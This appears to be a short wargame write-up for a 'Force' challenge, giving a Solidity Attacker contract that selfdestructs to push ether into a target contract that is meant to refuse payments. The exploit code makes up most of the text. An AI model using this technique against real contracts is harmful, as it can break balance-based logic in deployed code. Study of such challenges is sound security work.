# Force

This contract is supposedly not accepting any paymnets. Well, it is possible to force money in a contract by `selfdestruct`'ing a contract with some balance, with the target contract as the address.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

  constructor() payable {
  }

  function pwn(address _target) public {
    selfdestruct(payable(_target));
  }

  receive() external payable {}
  fallback() external payable {}
}
```

We create the above contract with some small amount of ether, and then call the `pwn` function to let it `selfdestruct` and transfer all of its balance to the target contract.
